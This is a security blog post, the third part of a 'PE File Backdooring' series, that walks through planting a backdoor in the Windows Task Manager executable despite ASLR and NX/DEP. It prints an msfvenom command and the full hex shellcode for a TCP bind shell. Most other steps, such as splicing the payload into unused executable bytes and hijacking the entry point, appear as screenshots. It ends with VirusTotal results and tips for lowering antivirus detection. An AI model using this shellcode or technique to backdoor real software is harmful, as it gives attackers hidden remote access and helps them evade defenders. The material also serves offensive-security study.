---
layout: post
title: Beating ASLR & NX/DEP without PE Headers/Code Caves (VOL:III)
date: 2020-03-08 18:00:00
categories: posts
comments: false
en: true
---

### Introduction

You find yourself reading the third volume of the "PE File Backdooring" series. As a result of such, I highly recommend reading the [first](https://whitecr0wz.github.io/posts/Backdooring-PE/) and [second](https://whitecr0wz.github.io/posts/Backdooring-PE-II/) blog post of the series, as it may help understanding 
the shown material on this post.

Today, I will be explaining how to backdoor PE Files when heavy protections such as ASLR and NX/DEP are present without altering the binary at all.
Furthermore, in order to replay the concept, the well-known [task manager](https://en.wikipedia.org/wiki/Task_Manager_(Windows)) will be employed, due to the reason that it has 
all protections enabled and as it is a common executable.

Let's check for available Code Caves just by curiosity.

```term
C:\Users\IEUser\AppData\Local\Programs\Python\Python38-32>python.exe pycave.py -
f C:\Windows\system32\taskmgr.exe
[+] Minimum code cave size: 300
[+] Image Base:  0x00400000
[+] Loading "C:\Windows\system32\taskmgr.exe"...

[!] ASLR is enabled. Virtual Address (VA) could be different once loaded in memo
ry.

[+] Looking for code caves...
[+] Code cave found in .data            Size: 4796 bytes        RA: 0x0001D694
VA: 0x0041E094
[+] Code cave found in .data            Size: 779 bytes         RA: 0x0001E9B1
VA: 0x0041F3B1
[+] Code cave found in .data            Size: 379 bytes         RA: 0x0001EF9D
VA: 0x0041F99D
[+] Code cave found in .rsrc            Size: 725 bytes         RA: 0x00024EAF
VA: 0x00426AAF
[+] Code cave found in .rsrc            Size: 682 bytes         RA: 0x000252DE
VA: 0x00426EDE
[+] Code cave found in .rsrc            Size: 700 bytes         RA: 0x00027434
VA: 0x00429034
[+] Code cave found in .rsrc            Size: 334 bytes         RA: 0x00027886
VA: 0x00429486
[+] Code cave found in .rsrc            Size: 312 bytes         RA: 0x00028760
VA: 0x0042A360
[+] Code cave found in .rsrc            Size: 308 bytes         RA: 0x0002910C
VA: 0x0042AD0C
[+] Code cave found in .rsrc            Size: 585 bytes         RA: 0x0002C233
VA: 0x0042DE33
[+] Code cave found in .rsrc            Size: 369 bytes         RA: 0x0002FCFB
VA: 0x004318FB
[+] Code cave found in .rsrc            Size: 585 bytes         RA: 0x00033613
VA: 0x00435213

C:\Users\IEUser\AppData\Local\Programs\Python\Python38-32>
```

Interesting, we see several places in which we could inject our payload. However, this is actually not possible, as NX/DEP would prevent our instructions from being executed. Of 
course, we could just change the properties of certain sections such as .data or .rsrc, but this is actually found off the bounds of this post, isn't it? We need to circumvent 
such environment without changing the binary too much.

Let's check the enabled protections.

![](/assets/img/Backdooring%20PE%20Files%20(VOL%20III)/1.png)

As aforementioned, everything seems enabled.

As we are unable to use a the addition of a PE Header and a Code Cave, we are left with pretty scarce options. Nevertheless, if checked on most binaries, at the bottom of the 
stack, we may find unused data that is partially executable.

![](/assets/img/Backdooring%20PE%20Files%20(VOL%20III)/2.png)

It isn't quite much, perhaps among 500 bytes, but it sure is enough to fit our payload and execute it. Sadly, encoding is not available in such scenarios, as the section is too 
privileged for certain encoding characters which are obligatory.

Let's check the entrypoint, as such addresses will be later on restored as explained on the previous posts.

![](/assets/img/Backdooring%20PE%20Files%20(VOL%20III)/3.png)

We see a CALL towards 00D68396. As we need to restore this function later on, if we simply replace it with a JMP, we may not have the address to restore due to ASLR. 
#### For such reasons, I will perform this step at the ending, placing the PUSHAD/PUSHFD + shellcode + alignment + POPFD/POPAD + restore first and then replace the entrypoint at 
last.

For this scenario, I will use address 00D7DE67.

Placing PUSHAD/PUSHFD.

![](/assets/img/Backdooring%20PE%20Files%20(VOL%20III)/4.png)

Generating shellcode.

```term
root@whitecr0wz:~# msfvenom -p windows/shell_bind_tcp LPORT=9000 -f hex 
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder or badchars specified, outputting raw payload
Payload size: 328 bytes
Final size of hex file: 656 bytes
fce8820000006089e531c0648b50308b520c8b52148b72280fb74a2631ffac3c617c022c20c1cf0d01c7e2f252578b52108b4a3c8b4c1178e34801d1518b592001d38b4918e33a498b348b01d631ffacc1cf0d01c738e075f
6037df83b7d2475e4588b582401d3668b0c4b8b581c01d38b048b01d0894424245b5b61595a51ffe05f5f5a8b12eb8d5d6833320000687773325f54684c772607ffd5b89001000029c454506829806b00ffd56a085950e2fd
4050405068ea0fdfe0ffd597680200232889e66a10565768c2db3767ffd55768b7e938ffffd5576874ec3be1ffd5579768756e4d61ffd568636d640089e357575731f66a125956e2fd66c744243c01018d442410c60044545
056565646564e565653566879cc3f86ffd589e04e5646ff306808871d60ffd5bbf0b5a25668a695bd9dffd53c067c0a80fbe07505bb4713726f6a0053ffd5
root@whitecr0wz:~# 
```

Pasting the shellcode.

![](/assets/img/Backdooring%20PE%20Files%20(VOL%20III)/5.png)

Performing additional modifications to the shellcode.

![](/assets/img/Backdooring%20PE%20Files%20(VOL%20III)/6.png)

Placing the alignment.

![](/assets/img/Backdooring%20PE%20Files%20(VOL%20III)/7.png)

Inserting the POPFD/POPAD instructions.

![](/assets/img/Backdooring%20PE%20Files%20(VOL%20III)/8.png)

Restoring the CALL instruction.

![](/assets/img/Backdooring%20PE%20Files%20(VOL%20III)/9.png)

Now, we could simply replace the CALL instruction without any issue.

Assembling the JMP towards the following address of the entrypoint.

![](/assets/img/Backdooring%20PE%20Files%20(VOL%20III)/10.png)

This is then saved.

![](/assets/img/Backdooring%20PE%20Files%20(VOL%20III)/11.png)

Replacing the entrypoint for a JMP instruction towards our unused bytes. Even though ASLR is enabled, it should be clarified that JMP instructions do not hardcode their address, 
as if we remember in the last post, the address the instruction was pointing to changed whenever the location of the JMP was modified, meaning that all JMP opcodes are relative 
to their location and do not hardcode addresses. In fact, you could even calculate the distance between the unused bytes and the Entry Point and the result would be the same.

![](/assets/img/Backdooring%20PE%20Files%20(VOL%20III)/12.png)

This is then saved.

![](/assets/img/Backdooring%20PE%20Files%20(VOL%20III)/13.png)

If this is run, we may see how the shellcode is executed as intended without any complication!

![](/assets/img/Backdooring%20PE%20Files%20(VOL%20III)/14.gif)

Results of VirusTotal:

![](/assets/img/Backdooring%20PE%20Files%20(VOL%20III)/15.png)

Even though the results are very weak, this could be  improved by changing this shellcode for one that is not as known, as the one used for these posts is pretty noisy against 
Anti-Malware software. Furthermore, the techniques discussed on the [previous](https://whitecr0wz.github.io/posts/Backdooring-PE-II/) post could be from great help in order to 
lower the detection.

Thank you for reading! 

#### References
Capt. Meelo’s post: [https://captmeelo.com/exploitdev/osceprep/2018/07/21/backdoor101-part2.html](https://captmeelo.com/exploitdev/osceprep/2018/07/21/backdoor101-part2.html).

Online x86/x64 Assembler/Disassembler: [https://defuse.ca/online-x86-assembler.htm#disassembly2](https://defuse.ca/online-x86-assembler.htm#disassembly2).
